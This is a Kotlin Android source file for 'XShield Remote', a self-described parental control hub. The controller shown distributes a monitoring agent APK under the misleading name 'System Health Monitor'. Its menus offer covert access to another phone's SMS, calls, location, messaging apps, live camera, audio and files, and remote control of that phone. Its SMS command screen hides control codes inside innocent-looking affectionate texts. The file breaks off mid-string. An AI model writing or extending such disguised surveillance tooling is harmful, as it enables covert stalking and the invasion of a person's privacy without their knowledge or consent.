package com.example.xshield

import android.content.Context
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.xshield.ui.theme.*
import androidx.compose.foundation.BorderStroke
import androidx.compose.ui.text.style.TextAlign
import kotlinx.coroutines.launch
import android.content.Intent
import androidx.core.content.FileProvider
import java.io.File
import java.io.FileOutputStream
import android.widget.Toast

class MainActivity : ComponentActivity() {
    private lateinit var webServer: LocalWebServer

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        webServer = LocalWebServer(this, 8080)
        XshieldRepository.initialize(this)
        enableEdgeToEdge()
        setContent {
            XshieldTheme {
                MainDashboardHost(webServer = webServer)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        webServer.stop()
    }
}

// Global utility function to extract and share target apk via System Share Sheet
fun shareChildApk(context: Context) {
    try {
        val assetManager = context.assets
        val inputStream = assetManager.open("childagent.apk")
        val cacheFile = File(context.cacheDir, "childagent.apk")
        val outputStream = FileOutputStream(cacheFile)
        
        val buffer = ByteArray(8192)
        var bytesRead: Int
        while (inputStream.read(buffer).also { bytesRead = it } != -1) {
            outputStream.write(buffer, 0, bytesRead)
        }
        outputStream.flush()
        outputStream.close()
        inputStream.close()

        // Check if the copied file is the placeholder text file (usually < 10KB) rather than a real compiled APK
        if (cacheFile.exists() && cacheFile.length() < 10000) {
            Toast.makeText(context, "System Health Monitor APK is not compiled yet. Please run/build the project in Android Studio first to generate the APK.", Toast.LENGTH_LONG).show()
            return
        }
        
        val uri = FileProvider.getUriForFile(
            context,
            "${context.packageName}.fileprovider",
            cacheFile
        )
        
        val intent = Intent(Intent.ACTION_SEND).apply {
            type = "application/vnd.android.package-archive"
            putExtra(Intent.EXTRA_STREAM, uri)
            // Explicitly set clipData and grant read URI permission so receiving apps (like WhatsApp) can read the file
            clipData = android.content.ClipData.newRawUri("", uri)
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        context.startActivity(Intent.createChooser(intent, "Share System Health Monitor APK"))
    } catch (e: Exception) {
        e.printStackTrace()
        Toast.makeText(context, "System Health Monitor APK not built yet. Verify local builds.", Toast.LENGTH_LONG).show()
    }
}

@Composable
fun NoDeviceConnectionScreen() {
    val context = androidx.compose.ui.platform.LocalContext.current
    val localIp = remember { LocalWebServer.getLocalIpAddress() }
    val downloadUrl = "http://$localIp:8080/childagent.apk?auth=${XshieldRepository.secureToken}"

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(BackgroundGrey)
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 24.dp),
            colors = CardDefaults.cardColors(containerColor = WhiteSurface),
            shape = RoundedCornerShape(16.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 4.dp),
            border = BorderStroke(1.dp, BorderColor)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                // Logo image container
                Box(
                    modifier = Modifier
                        .size(80.dp)
                        .clip(CircleShape)
                        .background(Color.White)
                        .border(1.dp, BorderColor, CircleShape),
                    contentAlignment = Alignment.Center
                ) {
                    androidx.compose.foundation.Image(
                        painter = androidx.compose.ui.res.painterResource(id = R.drawable.xsheild),
                        contentDescription = "Logo",
                        modifier = Modifier.size(64.dp)
                    )
                }

                Text(
                    text = "No Connected Target Device",
                    color = DarkText,
                    fontSize = 20.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center
                )

                Text(
                    text = "Link a target device to start monitoring calls, messages, locations, and other device statistics.",
                    color = LightText,
                    fontSize = 13.sp,
                    textAlign = TextAlign.Center,
                    modifier = Modifier.padding(horizontal = 8.dp)
                )

                Divider(color = BorderColor)

                // Setup Guide Steps
                Column(
                    verticalArrangement = Arrangement.spacedBy(12.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        text = "How to pair a new device:",
                        fontWeight = FontWeight.Bold,
                        color = DarkText,
                        fontSize = 14.sp
                    )

                    ConnectionStepItem(
                        stepNumber = "1",
                        text = "Install the System Health Monitor APK on the target device. Tap 'Share Installer APK' below to send it, or use the Wi-Fi download link."
                    )
                    ConnectionStepItem(
                        stepNumber = "2",
                        text = "Open the 'System Health Monitor' app on the target device, grant the required permissions, and tap 'Activate'."
                    )
                    ConnectionStepItem(
                        stepNumber = "3",
                        text = "Once activated, the target device will automatically appear here within seconds. No pairing codes needed!"
                    )
                }

                Divider(color = BorderColor)

                // Wi-Fi Install helper card
                if (localIp.isNotBlank() && localIp != "127.0.0.1") {
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(Color(0xFF2E7D32).copy(alpha = 0.08f), RoundedCornerShape(8.dp))
                            .border(1.dp, Color(0xFF2E7D32).copy(alpha = 0.2f), RoundedCornerShape(8.dp))
                            .padding(12.dp)
                    ) {
                        Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                            Text(
                                text = "Wi-Fi Direct Download Link:",
                                fontWeight = FontWeight.Bold,
                                color = Color(0xFF2E7D32),
                                fontSize = 12.sp
                            )
                            Text(
                                text = "Open this link in the child's browser to download directly:\n$downloadUrl",
                                fontSize = 11.sp,
                                color = Color(0xFF2E7D32)
                            )
                        }
                    }
                }

                Spacer(modifier = Modifier.height(8.dp))

                // Onboarding Action Buttons
                OutlinedButton(
                    onClick = { shareChildApk(context) },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.outlinedButtonColors(contentColor = PrimaryBlue),
                    border = BorderStroke(1.dp, PrimaryBlue),
                    shape = RoundedCornerShape(6.dp)
                ) {
                    Icon(Icons.Default.Share, contentDescription = null, tint = PrimaryBlue)
                    Spacer(modifier = Modifier.width(8.dp))
                    Text("SHARE SYSTEM HEALTH MONITOR APK", fontWeight = FontWeight.Bold, fontSize = 13.sp)
                }
            }
        }
    }
}

@Composable
fun ConnectionStepItem(stepNumber: String, text: String) {
    Row(
        horizontalArrangement = Arrangement.spacedBy(12.dp),
        verticalAlignment = Alignment.Top,
        modifier = Modifier.fillMaxWidth()
    ) {
        Box(
            modifier = Modifier
                .size(24.dp)
                .background(AccentTeal, CircleShape),
            contentAlignment = Alignment.Center
        ) {
            Text(
                text = stepNumber,
                color = Color.White,
                fontSize = 12.sp,
                fontWeight = FontWeight.Bold
            )
        }
        Text(
            text = text,
            color = DarkText,
            fontSize = 12.sp,
            modifier = Modifier.weight(1f)
        )
    }
}

// Side menu items metadata
data class DrawerMenuItem(
    val title: String,
    val icon: ImageVector,
    val screenKey: String
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MainDashboardHost(webServer: LocalWebServer? = null) {
    val context = androidx.compose.ui.platform.LocalContext.current
    val drawerState = rememberDrawerState(initialValue = DrawerValue.Closed)
    val scope = rememberCoroutineScope()
    var currentScreen by remember { mutableStateOf("Dashboard") }
    var selectedVideoForPreview by remember { mutableStateOf<RecordedVideo?>(null) }

    val childDevices = XshieldRepository.childDevices
    val selectedDevice = XshieldRepository.selectedDevice.value
    var expandedDeviceMenu by remember { mutableStateOf(false) }

    val menuItems = remember {
        listOf(
            DrawerMenuItem("Dashboard", Icons.Default.Dashboard, "Dashboard"),
            DrawerMenuItem("SMS", Icons.Default.Message, "SMS"),
            DrawerMenuItem("MMS", Icons.Default.Email, "MMS"),
            DrawerMenuItem("Calls", Icons.Default.Call, "Calls"),
            DrawerMenuItem("Locations", Icons.Default.LocationOn, "Locations"),
            DrawerMenuItem("Pictures", Icons.Default.PhotoLibrary, "Pictures"),
            DrawerMenuItem("Apps", Icons.Default.Apps, "Apps"),
            DrawerMenuItem("Calendar", Icons.Default.CalendarMonth, "Calendar"),
            DrawerMenuItem("Site Web", Icons.Default.Language, "Site Web"),
            DrawerMenuItem("Screenshot", Icons.Default.Screenshot, "Screenshot"),
            DrawerMenuItem("Instant messaging", Icons.Default.Forum, "Instant messaging"),
            DrawerMenuItem("Remote control", Icons.Default.SettingsRemote, "Remote control"),
            DrawerMenuItem("Live viewing", Icons.Default.Videocam, "Live viewing"),
            DrawerMenuItem("Audio Streaming", Icons.Default.Mic, "Audio Streaming"),
            DrawerMenuItem("File Explorer", Icons.Default.FolderOpen, "File Explorer"),
            DrawerMenuItem("Schedule restriction", Icons.Default.Timer, "Schedule restriction"),
            DrawerMenuItem("SMS Commands", Icons.Default.Code, "SMS Commands"),
            DrawerMenuItem("Statistics", Icons.Default.BarChart, "Statistics"),
            DrawerMenuItem("My account", Icons.Default.AccountBox, "My account")
        )
    }

    ModalNavigationDrawer(
        drawerState = drawerState,
        drawerContent = {
            ModalDrawerSheet(
                drawerContainerColor = DarkSlate,
                modifier = Modifier.width(280.dp)
            ) {
                // Drawer Header
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(Color(0xFF1E252D))
                        .padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(12.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .size(48.dp)
                                .clip(RoundedCornerShape(8.dp))
                                .background(Color.White)
                                .border(1.dp, BorderColor, RoundedCornerShape(8.dp)),
                            contentAlignment = Alignment.Center
                        ) {
                            androidx.compose.foundation.Image(
                                painter = androidx.compose.ui.res.painterResource(id = R.drawable.xsheild),
                                contentDescription = "Logo",
                                modifier = Modifier.size(40.dp)
                            )
                        }
                        Column {
                            Text(
                                text = "XShield Remote",
                                color = Color.White,
                                fontSize = 18.sp,
                                fontWeight = FontWeight.Bold
                            )
                            Text(
                                text = "Parental Control Hub",
                                color = AccentTeal,
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Medium
                            )
                        }
                    }
                    
                    Divider(color = Color.White.copy(alpha = 0.1f), modifier = Modifier.padding(vertical = 4.dp))
                    
                    // Device selection Dropdown Menu
                    Box(modifier = Modifier.fillMaxWidth()) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(Color.White.copy(alpha = 0.08f), RoundedCornerShape(4.dp))
                                .clickable { expandedDeviceMenu = true }
                                .padding(8.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Row(
                                verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.spacedBy(8.dp)
                            ) {
                                Icon(Icons.Default.PhoneAndroid, contentDescription = null, tint = Color.White, modifier = Modifier.size(16.dp))
                                val friendlyName = if (selectedDevice.isEmpty()) "Link a Device" else (XshieldRepository.deviceNamesMap[selectedDevice] ?: selectedDevice)
                                Text(text = friendlyName, color = Color.White, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                            }
                            Icon(Icons.Default.ArrowDropDown, contentDescription = null, tint = Color.White, modifier = Modifier.size(16.dp))
                        }

                        DropdownMenu(
                            expanded = expandedDeviceMenu,
                            onDismissRequest = { expandedDeviceMenu = false },
                            modifier = Modifier.background(DarkSlate)
                        ) {
                            childDevices.forEach { deviceId ->
                                val friendlyName = XshieldRepository.deviceNamesMap[deviceId] ?: deviceId
                                DropdownMenuItem(
                                    text = { Text(friendlyName, color = Color.White, fontWeight = FontWeight.Bold) },
                                    onClick = {
                                        XshieldRepository.selectDevice(deviceId)
                                        expandedDeviceMenu = false
                                    }
                                )
                            }
                        }
                    }
                }

                // Drawer Body Navigation Items
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .weight(1f)
                        .verticalScroll(rememberScrollState())
                        .padding(12.dp),
                    verticalArrangement = Arrangement.spacedBy(4.dp)
                ) {
                    menuItems.forEach { item ->
                        val isSelected = currentScreen == item.screenKey
                        val bg = if (isSelected) SidebarActive.copy(alpha = 0.15f) else Color.Transparent
                        val textCol = if (isSelected) SidebarActive else Color.White.copy(alpha = 0.8f)
                        val iconCol = if (isSelected) SidebarActive else Color.White.copy(alpha = 0.6f)

                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clip(RoundedCornerShape(6.dp))
                                .background(bg)
                                .clickable {
                                    currentScreen = item.screenKey
                                    scope.launch { drawerState.close() }
                                }
                                .padding(horizontal = 12.dp, vertical = 10.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            Icon(
                                imageVector = item.icon,
                                contentDescription = item.title,
                                tint = iconCol,
                                modifier = Modifier.size(20.dp)
                            )
                            Text(
                                text = item.title,
                                color = textCol,
                                fontSize = 14.sp,
                                fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Medium
                            )
                        }
                    }
                }
            }
        }
    ) {
        Scaffold(
            topBar = {
                CenterAlignedTopAppBar(
                    title = {
                        Text(
                            text = currentScreen,
                            fontWeight = FontWeight.Bold,
                            fontSize = 18.sp,
                            color = Color.White
                        )
                    },
                    navigationIcon = {
                        IconButton(onClick = { scope.launch { drawerState.open() } }) {
                            Icon(Icons.Default.Menu, contentDescription = "Menu", tint = Color.White)
                        }
                    },
                    actions = {
                        // Synced device label in header
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(4.dp),
                            modifier = Modifier.padding(end = 12.dp)
                        ) {
                            Icon(Icons.Default.Sync, contentDescription = "Sync Ready", tint = AccentTeal, modifier = Modifier.size(16.dp))
                            val friendlyName = if (selectedDevice.isEmpty()) "No Device" else (XshieldRepository.deviceNamesMap[selectedDevice] ?: selectedDevice)
                            Text(text = "Synced: $friendlyName", color = AccentTeal, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                    },
                    colors = TopAppBarDefaults.centerAlignedTopAppBarColors(
                        containerColor = DarkSlate
                    )
                )
            }
        ) { innerPadding ->
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(innerPadding)
            ) {
                if (XshieldRepository.isChildRinging.value) {
                    androidx.compose.material3.AlertDialog(
                        onDismissRequest = { /* No dismiss, handled via Firebase state */ },
                        title = {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(Icons.Default.PhoneCallback, contentDescription = null, tint = RedAlert)
                                Spacer(modifier = Modifier.width(8.dp))
                                Text("Incoming Call", color = RedAlert, fontWeight = FontWeight.Bold)
                            }
                        },
                        text = {
                            Text("Target device is currently ringing.\n\nFrom: ${XshieldRepository.incomingRingingNumber.value}", fontSize = 16.sp)
                        },
                        confirmButton = {
                            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                Button(
                                    onClick = { XshieldRepository.sendCallControlCommand(selectedDevice, "ANSWER") },
                                    colors = ButtonDefaults.buttonColors(containerColor = AccentTeal)
                                ) {
                                    Text("Answer", color = Color.White)
                                }
                                Button(
                                    onClick = { XshieldRepository.sendCallControlCommand(selectedDevice, "BLOCK", XshieldRepository.incomingRingingNumber.value) },
                                    colors = ButtonDefaults.buttonColors(containerColor = RedAlert)
                                ) {
                                    Text("Block & Reject", color = Color.White)
                                }
                            }
                        },
                        dismissButton = {
                            OutlinedButton(onClick = { XshieldRepository.sendCallControlCommand(selectedDevice, "REJECT") }) {
                                Text("Reject", color = RedAlert)
                            }
                        }
                    )
                }

                if (selectedDevice.isEmpty()) {
                    NoDeviceConnectionScreen()
                } else {
                    // Navigate screens based on selection keys
                    when (currentScreen) {
                        "Dashboard" -> DashboardScreen(
                            selectedDevice = selectedDevice,
                            childDevices = childDevices,
                            onDeviceSelected = { device -> XshieldRepository.selectDevice(device) },
                            onAddDeviceClick = { },
                            onRemoveDevice = { device ->
                                if (childDevices.size > 1) {
                                    childDevices.remove(device)
                                    if (selectedDevice == device) {
                                        XshieldRepository.selectDevice(childDevices.first())
                                    }
                                }
                            },
                            onNavigateTo = { screen -> currentScreen = screen },
                            onServerToggle = { enabled ->
                                if (enabled) webServer?.start() else webServer?.stop()
                            }
                        )
                        "SMS" -> SmsMmsScreen(initialTabIsMms = false)
                        "MMS" -> SmsMmsScreen(initialTabIsMms = true)
                        "Calls" -> CallsScreen(initialViewIsBlockNumber = false)
                        "Locations" -> LocationsScreen()
                        "Pictures" -> PicturesScreen()
                        "Apps" -> AppsScreen()
                        "Calendar" -> SimplePlaceholderScreen("Calendar Agenda Logs", "Monitors targeted events and calendar scheduling on child device.") {
                            CalendarPlaceholder()
                        }
                        "Contacts" -> ContactsScreen()
                        "Site Web" -> SiteWebScreen(
                            onBack = { currentScreen = "Dashboard" }
                        )
                        "Screenshot" -> ScreenshotMonitorScreen(
                            onBack = { currentScreen = "Dashboard" }
                        )
                        "Instant messaging" -> InstantMessagingScreen(
                            onBack = { currentScreen = "Dashboard" }
                        )
                        "Remote control" -> LiveScreenShareScreen(
                            allowInteraction = true,
                            onBack = { currentScreen = "Dashboard" }
                        )
                        "Live viewing" -> LiveCameraScreen(
                            onBack = { currentScreen = "Dashboard" }, 
                            onNavigateToGallery = { currentScreen = "VideoGallery" },
                            onNavigateToVideoPreview = { video -> 
                                selectedVideoForPreview = video
                                currentScreen = "VideoPreview"
                            },
                            onNavigateToScreenShare = { currentScreen = "ScreenShare" }
                        )
                        "ScreenShare" -> LiveScreenShareScreen(
                            allowInteraction = false,
                            onBack = { currentScreen = "Live viewing" }
                        )
                        "Audio Streaming" -> AudioStreamingScreen()
                        "VideoGallery" -> CapturesGalleryScreen(
                            onBack = { currentScreen = "Remote control" },
                            onVideoSelected = { video ->
                                selectedVideoForPreview = video
                                currentScreen = "VideoPreview"
                            }
                        )
                        "VideoPreview" -> {
                            selectedVideoForPreview?.let { video ->
                                VideoPreviewScreen(video = video, onBack = { currentScreen = "VideoGallery" })
                            } ?: run {
                                currentScreen = "VideoGallery"
                            }
                        }
                        "File Explorer" -> FileExplorerScreen()
                        "Schedule restriction" -> ScheduleRestrictionScreen()
                        "SMS Commands" -> SmsCommandsScreen()
                        "Statistics" -> StatisticsScreen()
                        "My account" -> SimplePlaceholderScreen("Account & Licensing", "Details for client subscription telemetry, active serial keys, and plan tier limits.") {
                            AccountPlaceholder()
                        }
                        else -> DashboardScreen(
                            selectedDevice = selectedDevice,
                            childDevices = childDevices,
                            onDeviceSelected = { device -> XshieldRepository.selectDevice(device) },
                            onAddDeviceClick = { },
                            onRemoveDevice = { device ->
                                XshieldRepository.deleteDevice(device)
                                if (childDevices.size > 1) {
                                    childDevices.remove(device)
                                    if (selectedDevice == device) {
                                        XshieldRepository.selectDevice(childDevices.first())
                                    }
                                } else {
                                    childDevices.remove(device)
                                    XshieldRepository.selectDevice("")
                                }
                            },
                            onNavigateTo = { screen -> currentScreen = screen },
                            onServerToggle = { enabled ->
                                if (enabled) webServer?.start() else webServer?.stop()
                            }
                        )
                    }
                }
            }
        }
    }

}

// ==========================================
// MOCK PLACEHOLDER SCREENS & COMPOSABLES
// ==========================================
@Composable
fun SimplePlaceholderScreen(
    title: String,
    desc: String,
    content: @Composable () -> Unit
) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(BackgroundGrey)
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = WhiteSurface),
            shape = RoundedCornerShape(12.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(text = title, fontWeight = FontWeight.Bold, color = DarkText, fontSize = 16.sp)
                Spacer(modifier = Modifier.height(4.dp))
                Text(text = desc, color = LightText, fontSize = 12.sp)
            }
        }

        Card(
            modifier = Modifier
                .fillMaxWidth()
                .weight(1f),
            colors = CardDefaults.cardColors(containerColor = WhiteSurface),
            shape = RoundedCornerShape(12.dp)
        ) {
            Box(
                modifier = Modifier.fillMaxSize().padding(16.dp),
                contentAlignment = Alignment.TopStart
            ) {
                content()
            }
        }
    }
}

@Composable
fun CalendarPlaceholder() {
    val events = listOf(
        Pair("Science Project Submission", "Today 14:00 • School"),
        Pair("Dentist Appointment", "Tomorrow 16:30 • Care Dental"),
        Pair("Math Quiz Homework", "2026-06-08 09:00 • Classroom 4")
    )
    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
        events.forEach { ev ->
            Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                Icon(Icons.Default.EventNote, contentDescription = null, tint = AccentTeal)
                Column {
                    Text(text = ev.first, fontWeight = FontWeight.Bold, fontSize = 14.sp, color = DarkText)
                    Text(text = ev.second, fontSize = 12.sp, color = LightText)
                }
            }
            Divider(color = BorderColor)
        }
    }
}

@Composable
fun WebBrowserPlaceholder() {
    val sites = listOf(
        Pair("Google Search: 'android compose layout tutorial'", "Today 08:42"),
        Pair("wikipedia.org/wiki/Parental_control", "Today 08:15"),
        Pair("github.com/kotlin/compose-multiplatform", "Yesterday 19:22"),
        Pair("stackoverflow.com/questions", "Yesterday 18:02")
    )
    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
        sites.forEach { site ->
            Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                Icon(Icons.Default.Language, contentDescription = null, tint = PrimaryBlue)
                Column {
                    Text(text = site.first, fontWeight = FontWeight.Bold, fontSize = 14.sp, color = DarkText)
                    Text(text = site.second, fontSize = 12.sp, color = LightText)
                }
            }
            Divider(color = BorderColor)
        }
    }
}

@Composable
fun ScreenshotPlaceholder() {
    var screenshotsCount by remember { mutableStateOf(3) }
    
    Column(verticalArrangement = Arrangement.spacedBy(16.dp)) {
        Button(
            onClick = { /* Simulation trigger screen capture */ },
            colors = ButtonDefaults.buttonColors(containerColor = PrimaryBlue),
            shape = RoundedCornerShape(4.dp)
        ) {
            Icon(Icons.Default.Screenshot, contentDescription = null, tint = Color.White)
            Spacer(modifier = Modifier.width(8.dp))
            Text("TRIGGER REMOTE SCREENSHOT CAPTURE", fontWeight = FontWeight.Bold, color = Color.White)
        }

        Divider(color = BorderColor)

        Text("Captured Screens Log", fontWeight = FontWeight.Bold, color = DarkText)
        Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
            repeat(screenshotsCount) { index ->
                Card(
                    modifier = Modifier.size(90.dp).border(1.dp, BorderColor, RoundedCornerShape(6.dp)),
                    colors = CardDefaults.cardColors(containerColor = BackgroundGrey)
                ) {
                    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Icon(Icons.Default.Image, contentDescription = null, tint = LightText)
                            Text("Screen_${index + 1}", fontSize = 10.sp, color = LightText)
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun ChatPlaceholder() {
    val chatNotifications = listOf(
        Pair("WhatsApp from David", "Hey! Did you complete the project? • Today 09:12"),
        Pair("Instagram notification", "jack_run shared a post • Today 08:30"),
        Pair("Discord chat #general", "Gaming session starts in 1 hour • Yesterday 22:15")
    )
    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
        chatNotifications.forEach { chat ->
            Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                Icon(Icons.Default.Forum, contentDescription = null, tint = PlayWaveColor)
                Column {
                    Text(text = chat.first, fontWeight = FontWeight.Bold, fontSize = 14.sp, color = DarkText)
                    Text(text = chat.second, fontSize = 12.sp, color = LightText)
                }
            }
            Divider(color = BorderColor)
        }
    }
}

@Composable
fun FileExplorerPlaceholder() {
    val folders = listOf("/Pictures", "/Download", "/Documents", "/Android")
    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
        Text("Target Root Directory: /storage/emulated/0/", fontWeight = FontWeight.Bold, color = LightText, fontSize = 12.sp)
        folders.forEach { folder ->
            Row(horizontalArrangement = Arrangement.spacedBy(12.dp), verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Default.Folder, contentDescription = null, tint = Color(0xFFF0AD4E))
                Text(text = folder, fontWeight = FontWeight.Bold, fontSize = 14.sp, color = DarkText)
            }
            Divider(color = BorderColor)
        }
    }
}

@Composable
fun SmsCommandsScreen() {
    val parentPhone by XshieldRepository.parentPhoneNumber
    val isParentConfigured = parentPhone.isNotBlank()
    val friendDisguisePhone by XshieldRepository.friendDisguiseNumber
    val isDisguiseConfigured = friendDisguisePhone.isNotBlank()
    val context = androidx.compose.ui.platform.LocalContext.current

    // Child phone number — stored locally in SharedPreferences
    val prefs = androidx.compose.runtime.remember {
        context.getSharedPreferences("sms_cmd_prefs", android.content.Context.MODE_PRIVATE)
    }
    var childPhone by androidx.compose.runtime.remember {
        mutableStateOf(prefs.getString("child_phone_number", "") ?: "")
    }
    var childPhoneSaved by androidx.compose.runtime.remember { mutableStateOf(childPhone.isNotBlank()) }

    // Runtime SEND_SMS permission
    val permissionLauncher = androidx.activity.compose.rememberLauncherForActivityResult(
        contract = androidx.activity.result.contract.ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (!granted) {
            Toast.makeText(context, "SMS permission denied — cannot send commands.", Toast.LENGTH_LONG).show()
        }
    }

    fun sendSmsCommand(message: String) {
        val target = childPhone.trim()
        if (target.isBlank()) {
            Toast.makeText(context, "Please enter child's phone number first.", Toast.LENGTH_SHORT).show()
            return
        }
        val hasPerm = androidx.core.content.ContextCompat.checkSelfPermission(
            context, android.Manifest.permission.SEND_SMS
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

        if (!hasPerm) {
            permissionLauncher.launch(android.Manifest.permission.SEND_SMS)
            return
        }
        try {
            @Suppress("DEPRECATION")
            val smsManager = android.telephony.SmsManager.getDefault()
            val parts = smsManager.divideMessage(message)
            if (parts.size == 1) {
                smsManager.sendTextMessage(target, null, message, null, null)
            } else {
                smsManager.sendMultipartTextMessage(target, null, parts, null, null)
            }
            Toast.makeText(context, "✓ Command sent to child device!", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Toast.makeText(context, "Failed to send: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    data class SmsCmd(
        val label: String,
        val command: String,
        val description: String,
        val category: String,
        val categoryColor: Color,
        val icon: androidx.compose.ui.graphics.vector.ImageVector,
        val defaultTemplate: String
    )

    val commands = listOf(
        SmsCmd("Locate Device", "#XSHIELD#LOCATE",
            "Child device replies with a live Google Maps location link.",
            "Location", Color(0xFF2196F3), Icons.Default.LocationOn,
            "Hey beta, how was school today? #XSHIELD#LOCATE"),
        SmsCmd("Start Siren", "#XSHIELD#SIREN",
            "Triggers a loud alarm on the child's device at max volume.",
            "Alarm", Color(0xFFFF5722), Icons.Default.VolumeUp,
            "Missing your smile! #XSHIELD#SIREN Come home soon."),
        SmsCmd("Stop Siren", "#XSHIELD#SIREN_STOP",
            "Stops the alarm immediately.",
            "Alarm", Color(0xFFFF5722), Icons.Default.VolumeOff,
            "It's okay beta, relax now. #XSHIELD#SIREN_STOP"),
        SmsCmd("Lock Device", "#XSHIELD#LOCK",
            "Blocks all app launches on the child's device.",
            "Device Lock", Color(0xFFF44336), Icons.Default.Lock,
            "Take a study break now. #XSHIELD#LOCK Love you."),
        SmsCmd("Unlock Device", "#XSHIELD#UNLOCK",
            "Restores normal access on the child's device.",
            "Device Lock", Color(0xFF4CAF50), Icons.Default.LockOpen,
            "Study time done, have fun! #XSHIELD#UNLOCK"),
        SmsCmd("Block App", "#XSHIELD#BLOCK#",
            "Blocks a specific app. Add package name after the last #.",
            "App Control", Color(0xFF9C27B0), Icons.Default.Block,
            "Focus mode on. #XSHIELD#BLOCK#com.example.app"),
        SmsCmd("Unblock App", "#XSHIELD#UNBLOCK#",
            "Unblocks a previously blocked app.",
            "App Control", Color(0xFF9C27B0), Icons.Default.CheckCircle,
            "All good now. #XSHIELD#UNBLOCK#com.example.app")
    )

    // Per-command editable message state
    val messageStates = androidx.compose.runtime.remember {
        commands.map { mutableStateOf(it.defaultTemplate) }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFFF5F7FA))
            .verticalScroll(rememberScrollState())
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        // ── Header ───────────────────────────────────────────────────────────────
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(16.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF1A237E)),
            elevation = CardDefaults.cardElevation(6.dp)
        ) {
            Row(
                modifier = Modifier.padding(20.dp),
                horizontalArrangement = Arrangement.spacedBy(16.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Box(
                    modifier = Modifier.size(52.dp).background(Color.White.copy(alpha = 0.15f), CircleShape),
                    contentAlignment = Alignment.Center
                ) {
                    Icon(Icons.Default.Sms, contentDescription = null, tint = Color.White, modifier = Modifier.size(28.dp))
                }
                Column(modifier = Modifier.weight(1f)) {
                    Text("SMS Remote Commands", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 17.sp)
                    Spacer(modifier = Modifier.height(4.dp))
                    Text(
                        "Works offline — no internet needed. Commands hidden inside normal messages.",
